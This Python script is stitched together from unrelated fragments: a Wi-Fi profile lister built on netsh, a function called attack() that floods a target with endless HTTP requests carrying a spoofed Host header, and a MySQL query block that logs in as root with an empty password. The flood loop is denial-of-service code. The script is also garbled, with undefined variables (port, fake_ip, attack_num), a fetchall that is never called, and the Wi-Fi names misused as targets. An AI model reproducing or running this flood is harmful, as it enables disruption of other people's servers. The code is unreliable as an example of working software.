# importing subprocess
import subprocess
import mysql.connector
import numpy as np
import matplotlib.pyplot as plt
import socket



# getting meta data of the wifi network
meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])

# decoding meta data from byte to string
data = meta_data.decode('utf-8', errors ="backslashreplace")

# splitting data by line by line
# string to list
data = data.split('\n')

# creating a list of wifi names
names = []

# traverse the list
for i in data:
	
	# find "All User Profile" in each item
	# as this item will have the wifi name
	if "All User Profile" in i :
		
		# if found split the item
		# in order to get only the name
		i = i.split(":")
		
		# item at index 1 will be the wifi name
		i = i[1]
		
		# formatting the name
		# first and last character is use less
		i = i[1:-1]
		
		# appending the wifi name in the list
		names.append(i)

# printing the wifi names
print("All wifi that system has connected to are ")
print("-----------------------------------------")
for name in names:
	print(name)
target= socket.gethostbyname(name)
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
mydb = mysql.connector.connect(host="localhost",
                               user="root",
                               password="",
                               database="meter")
mycursor = mydb.cursor()
# Initialise the subplot function using number of rows and columns
fig, ax = plt.subplots(2)
#fig, (ax1, ax2) = plt.subplots(1, 2)
# Fecthing Data From mysql to my python progame
#FORMAT(watt,3)

mycursor.execute("select id, device from devices where device='name'")
result = mycursor.fetchall
 
device = []
id = []
 
for i in mycursor:
    device.append(i[0])
    id.append(i[1])
    attack()


        



